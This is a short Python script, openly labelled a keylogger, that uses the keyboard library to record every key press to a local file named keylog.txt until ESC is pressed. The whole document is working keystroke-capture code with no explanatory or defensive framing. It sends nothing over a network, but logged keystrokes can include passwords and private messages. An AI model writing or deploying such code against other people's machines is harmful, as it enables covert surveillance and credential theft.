import keyboard
import time

def keylogger(log_file="keylog.txt"):
    with open(log_file, "a") as f:
        def on_press(event):
            f.write(f"{event.name}\n")
            f.flush()
        keyboard.on_press(on_press)
        print("Keylogger started. Press ESC to stop.")
        keyboard.wait('esc')

keylogger()
